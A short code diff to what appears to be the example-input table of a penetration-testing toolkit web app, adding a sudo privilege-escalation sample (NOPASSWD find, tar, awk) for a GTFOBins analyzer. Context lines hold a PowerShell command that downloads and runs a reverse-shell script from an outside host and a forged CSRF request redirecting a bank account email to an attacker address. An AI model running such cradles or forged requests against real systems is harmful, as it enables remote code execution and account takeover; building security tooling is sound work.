@@ -60,6 +60,9 @@ const EXAMPLES = {
   'ps-encode': () => { exFill('pe-in', "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.7/rev.ps1')"); },
   'notationer': () => { exFill('not-in', ['userProfileId', 'max retry count', 'HTTP-Response-Code', 'is_admin_user', 'API_KEY_SECRET'].join('\n')); },
 
+  // ---- Privesc ----
+  'gtfobins': () => { exClickText('Analyze output'); exFill('gtf-paste', 'User www-data may run the following commands:\n    (root) NOPASSWD: /usr/bin/find\n    (root) NOPASSWD: /usr/bin/tar\n    (root) NOPASSWD: /usr/bin/awk'); },
+
   // ---- Payloads ----
   'csrf-poc': () => { exFill('csrf-raw', `POST /account/email HTTP/1.1\nHost: bank.example.com\nCookie: session=eyJ1c2VyIjoidmljdGltIn0\nContent-Type: application/x-www-form-urlencoded\n\nemail=attacker%40evil.com`); exFill('csrf-scheme', 'https'); exFill('csrf-submit', 'auto'); exClick('csrf-gen'); },
   'dos-gen': () => { exFill('dos-text', 'A'); exFill('dos-count', '50000'); exClick('dos-preview'); },
